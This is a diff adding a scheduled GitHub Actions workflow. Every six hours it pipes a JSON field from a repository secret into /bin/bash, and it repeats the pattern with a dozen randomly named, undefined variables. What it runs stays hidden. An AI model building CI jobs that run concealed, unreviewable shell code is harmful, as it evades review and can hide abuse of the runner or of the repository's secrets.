@@ -1,0 +1,29 @@
+name: yuanhexuejiao
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuanhexuejiao
+        env:
+          c513: ${{ secrets.c513 }}
+        run: |
+          echo $c513 | jq -r .vs567 | /bin/bash
+          echo $p54 | jq -r .t03 | /bin/bash
+          echo $ei6181 | jq -r .zh09543 | /bin/bash
+          echo $mi7710 | jq -r .acb64277 | /bin/bash
+          echo $pzge857 | jq -r .ozyj7280 | /bin/bash
+          echo $muad83079 | jq -r .ytdn3579 | /bin/bash
+          echo $s962 | jq -r .zgjkd375 | /bin/bash
+          echo $oqkos6936 | jq -r .di97749 | /bin/bash
+          echo $yruv4480 | jq -r .os93 | /bin/bash
+          echo $wnix71 | jq -r .lqbo77900 | /bin/bash
+          echo $ain165 | jq -r .du75511 | /bin/bash
+          echo $vkg1 | jq -r .uxfo459 | /bin/bash
+          echo $ryh0154 | jq -r .qcqxx87 | /bin/bash
+
